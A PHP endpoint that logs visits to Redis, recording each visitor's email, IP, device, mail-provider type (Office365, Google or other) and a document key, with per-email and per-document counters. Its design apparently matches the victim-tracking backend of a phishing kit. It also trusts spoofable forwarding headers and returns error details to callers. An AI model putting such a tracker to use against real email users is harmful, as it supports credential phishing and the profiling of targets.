<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Only POST allowed
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

try {
    // Get POST data
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if (!$data) {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'Invalid JSON data']);
        exit;
    }

    // Validate required fields
    if (empty($data['email']) || empty($data['device']) || empty($data['mx_type'])) {
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'error' => 'Missing required fields: email, device, mx_type'
        ]);
        exit;
    }

    // Validate MX type
    $validMxTypes = ['office365', 'google', 'other'];
    $mxType = strtolower($data['mx_type']);
    if (!in_array($mxType, $validMxTypes)) {
        $mxType = 'other';
    }

    // Get IP address
    $ip = getClientIP();

    // Connect to Redis
    $redis = connectRedis();

    // Create visit record
    $timestamp = round(microtime(true) * 1000);
    $visitId = 'visit:' . $timestamp . ':' . bin2hex(random_bytes(4));
    $visitData = [
        'ip' => $ip,
        'email' => $data['email'],
        'device' => $data['device'],
        'mx_type' => $mxType,
        'document_key' => $data['document_key'] ?? 'unknown',
        'timestamp' => date('c')
    ];

    // Store in Redis (90 days = 7776000 seconds)
    $redis->setex($visitId, 7776000, json_encode($visitData));

    // Add to global timeline
    $redis->zadd('visits:timeline', $timestamp, $visitId);

    // Group by document key
    if (!empty($data['document_key'])) {
        $docKey = $data['document_key'];
        $redis->zadd("visits:key:$docKey", $timestamp, $visitId);
        $redis->hincrby('visits:count_by_key', $docKey, 1);
        $redis->sadd("visits:key:$docKey:emails", $data['email']);
    }

    // Global stats
    $redis->hincrby('visits:stats:by_email', $data['email'], 1);
    $redis->hincrby('visits:stats:by_device', $data['device'], 1);
    $redis->hincrby('visits:stats:by_mx_type', $mxType, 1);
    $redis->incr('visits:stats:total');

    $redis->close();

    echo json_encode([
        'success' => true,
        'visit_id' => $visitId,
        'ip' => $ip,
        'mx_type' => $mxType,
        'document_key' => $data['document_key'] ?? 'unknown',
        'timestamp' => $visitData['timestamp']
    ]);

} catch (Exception $e) {
    error_log('Visit logging error: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Failed to log visit',
        'details' => $e->getMessage()
    ]);
}

// ========== HELPER FUNCTIONS ==========

function getClientIP() {
    $headers = [
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP',
        'REMOTE_ADDR'
    ];

    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            if (strpos($ip, ',') !== false) {
                $ips = explode(',', $ip);
                $ip = trim($ips[0]);
            }
            return $ip;
        }
    }

    return 'unknown';
}

function connectRedis() {
    $redisUrl = getenv('REDIS_URL');
    
    if (!$redisUrl) {
        throw new Exception('REDIS_URL not configured');
    }

    // Parse Redis URL: redis://user:pass@host:port
    $parsed = parse_url($redisUrl);
    
    $host = $parsed['host'] ?? 'localhost';
    $port = $parsed['port'] ?? 6379;
    $password = $parsed['pass'] ?? null;

    $redis = new Redis();
    
    if (!$redis->connect($host, $port, 5)) {
        throw new Exception('Could not connect to Redis');
    }

    if ($password) {
        if (!$redis->auth($password)) {
            throw new Exception('Redis authentication failed');
        }
    }

    return $redis;
}
?>